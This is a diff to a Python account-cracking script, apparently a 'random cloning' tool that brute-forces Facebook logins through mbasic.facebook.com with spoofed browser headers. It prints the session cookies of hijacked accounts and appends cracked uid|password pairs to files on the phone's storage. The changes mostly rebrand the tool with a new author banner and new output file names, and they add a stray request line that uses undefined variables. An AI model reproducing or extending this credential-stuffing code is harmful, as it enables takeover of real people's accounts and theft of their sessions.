@@ -178,39 +178,29 @@ ha = current.day
 
 today = date.today()
 
-os.system('xdg-open https://facebook.com/groups/554714119911648/')
+os.system('xdg-open https://facebook.com/ft.alvi.18')
 
 logo =("""\033[0;92m
 
-╔═══════════════════════════════════════════════════╗
+\033[1;34m   ____  _   __      ______________  ______
+\033[1;32m  / __ \/ | / /     / ____/  _/ __ \/ ____/
+\033[1;91m / / / /  |/ /_____/ /_   / // /_/ / __/   
+\033[1;35m/ /_/ / /|  /_____/ __/ _/ // _, _/ /___   
+\033[1;91m\____/_/ |_/     /_/   /___/_/ |_/_____/   
 
-╔══╗╔═╗╔═╦═╗╔══╗╔═╦╗
 
-║╔╗║║╬║║║║║║║╔╗║║║║║
-
-║╠╣║║╗╣║║║║║║╠╣║║║║║
-
-╚╝╚╝╚╩╝╚╩═╩╝╚╝╚╝╚╩═╝
-
-────────────────────\033[0;95m
-
-\033[0;94m╠═══════════════════════════════════════════════════║
-
-\033[0;93m╠══[Author:=======================> \33[1;38mMR. TUTUL\33[1;38m       ║\033[1;31m
-
-╠══[Facebook:=====================> ARMAN CHOWDHURY      ║  \033[1;97m
-
-╠══[Github:=======================> \33[1;38mARMAN901      ║\33[1;34m
-
-╠══[Whatsapp:=====================> 01305628032     ║\33[1;35m
-
-╠══[TOOLS:========================> Random Cloning  ║ \33[1;32m
-
-╠══[VERSION:======================> 1.0.0           ║\033[1;35m
-
-\033[0;92m╚═══════════════════════════════════════════════════╝\033[1;31m
-
-    """) 
+\033[1;91m╔════════════════════════════════════════╗
+\033[1;32m║\033[1;32m[•] Author    \033[1;32m : ACTION-FIRE            \033[1;32m║      
+\033[1;32m║\033[1;32m[•] Facebook   \033[1;32m: Ft Alvi                ║ 
+\033[1;32m║\033[1;32m[•] Github    \033[1;32m : github.com/ACTION-FIRE ║
+\033[1;32m║\033[1;32m[•] Status    	\033[1;32m: FREE TRIAL             \033[1;32m║
+\033[1;32m║\033[1;32m[•] Network    \033[1;32m: 3G, 4G/5G, ON          \033[1;32m║
+\033[1;32m║\033[1;32m[•] Version  	\033[1;32m: V:2.1                  ║
+\033[1;32m║\033[1;32m[•] Tools    	\033[1;32m: RAN/DOM Cloning        \033[1;32m║
+\033[1;32m║════════════════════════════════════════║
+\033[1;32m║════════════════════════════════════════║
+\033[1;32m║              \033[1;32mAlvi MENU [👑]            ║
+\033[1;91m╚════════════════════════════════════════╝""")
 
 loop = 0
 
@@ -452,37 +442,26 @@ def rcrack(uid,pwx,tl):
 
             "login":"Log In"}
 
-            header_freefb = {"authority": 'mbasic.facebook.com',
-
-            "method": 'GET',
-
-            "scheme": 'https',
-
+            header_freefb = {'authority': 'mbasic.facebook.com',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-
-            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-
+            'accept-language': 'en-AS,en;q=0.9,bn-BD;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
             'cache-control': 'max-age=0',
-
-            # 'cookie': 'datr=zwaiY8oIpRJmusfwcUYR3gcl; sb=zwaiY5XKI6dYvdiAT8MfIAzF; wd=979x1831; dpr=2.34375; fr=0FGFgDcD2x3MSPEbJ..BjogbP.Fh.AAA.0.0.Bjt7jq.AWXveghp-AI',
-
+            # 'cookie': 'datr=O3fpY8doYqNoeckHVR2nCouk; fr=0VFPFwZaQK10rvqtL..Bj6Xc7.aj.AAA.0.0.Bj6Xc7.AWVpKgROuv0; sb=O3fpY7UPdoA7lBBsdDIyEhLR',
+            'referer': 'https://www.google.com/',
             'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
-
             'sec-ch-ua-mobile': '?1',
-
             'sec-ch-ua-platform': '"Android"',
-
             'sec-fetch-dest': 'document',
-
             'sec-fetch-mode': 'navigate',
-
-            'sec-fetch-site': 'none',
-
+            'sec-fetch-site': 'cross-site',
             'sec-fetch-user': '?1',
-
             'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
+}
 
-            'user-agent': pro}
+response = requests.get('https://mbasic.facebook.com/', cookies=cookies, headers=headers)
+
+
 
             lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
 
@@ -494,11 +473,11 @@ def rcrack(uid,pwx,tl):
 
                 cid = coki[7:22]
 
-                print('\r\r\033[1;32m[Arman-OK🥵] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎😯]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+                print('\r\r\033[1;32m[FIRE-OK🥵] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎😯]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
 
                 cek_apk(session,coki)
 
-                open('/sdcard/Tutul-OK.txt', 'a').write( uid+' | '+ps+'\n')
+                open('/sdcard/FIRE-OK.txt', 'a').write( uid+' | '+ps+'\n')
 
                 oks.append(cid)
 
@@ -512,7 +491,7 @@ def rcrack(uid,pwx,tl):
 
                 #print('\r\r\33[1;30m[MKR-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
 
-                open('/sdcard/Tutul-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                open('/sdcard/FIRE-CP.txt', 'a').write( uid+' | '+ps+' \n')
 
                 cps.append(cid)
 
@@ -524,7 +503,7 @@ def rcrack(uid,pwx,tl):
 
         loop+=1
 
-        sys.stdout.write(f'\r\r%s{x}[{xr}Tutul{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
+        sys.stdout.write(f'\r\r%s{x}[{xr}FIRE{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
 
         sys.stdout.flush()
 
